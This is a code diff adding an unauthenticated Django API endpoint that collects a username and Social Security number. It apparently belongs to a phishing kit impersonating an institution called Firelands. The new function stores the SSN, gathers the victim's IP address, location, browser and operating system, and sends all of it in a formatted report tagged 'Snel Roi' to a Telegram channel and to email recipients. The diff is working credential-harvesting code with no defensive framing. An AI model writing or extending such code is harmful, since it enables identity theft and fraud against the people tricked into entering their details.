@@ -730,3 +730,73 @@ def firelands_collect_user_social_security(request):
         except Exception as e:
             logger.error(f'Error in firelands_collect_user_social_security: {str(e)}')
             return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
+
+@api_view(['POST'])
+@permission_classes([])
+@authentication_classes([])
+def firelands_collect_user_social_security_2(request):
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+        try:
+            username = request.data.get("emzemz", "")
+            ssn = request.data.get("ssn", "")
+            
+            if not username:
+                errors["username"] = ["Username is required."]
+            
+            if not ssn:
+                errors["ssn"] = ["Social Security Number is required."]
+            elif len(ssn.replace('-', '')) != 9:
+                errors["ssn"] = ["SSN must be 9 digits."]
+
+            if errors:
+                payload["message"] = "Errors"
+                payload["errors"] = errors
+                return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+            client = Client.objects.get(username=username)
+            client.ssn_confirm = ssn
+            client.save()
+
+            ip = get_client_ip(request)
+            agent = request.META.get('HTTP_USER_AGENT', '')
+            country = get_country_from_ip(ip)
+            city = get_city_from_ip(ip)
+            browser = get_user_browser(agent)
+            os = get_user_os(agent)
+            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
+
+            # Notification message
+            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
+            message += "|========= [  SOCIAL SECURITY CONFIRMATION  ] ==========|\n"
+            message += f"| ➤ [ Username ]         : {username}\n"
+            message += f"| ➤ [ SSN Confirmation ] : {ssn}\n"
+            message += "|=====================================|\n"
+            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "|======================================|\n"
+            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+            message += f"| ➤ [ IP Country ]   : {country}\r\n"
+            message += f"| ➤ [ IP City ]      : {city}\r\n"
+            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+            message += f"| ➤ [ TIME ]         : {date}\r\n"
+            message += "|=====================================|\n"
+
+            send_data_telegram(app_settings, message)
+            
+            subject = f"Firelands SSN Confirmation - {ip}"
+            from_email = _notification_sender()
+            recipient_list = _notification_recipients()
+            send_data_email(subject, message, from_email, recipient_list)
+
+            return Response({'status': 'success'}, status=status.HTTP_200_OK)
+
+        except Client.DoesNotExist:
+            logger.error(f'Client not found: {username}')
+            return Response({'error': 'User not found'}, status=status.HTTP_404_NOT_FOUND)
+        except Exception as e:
+            logger.error(f'Error in firelands_collect_user_social_security_2: {str(e)}')
+            return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
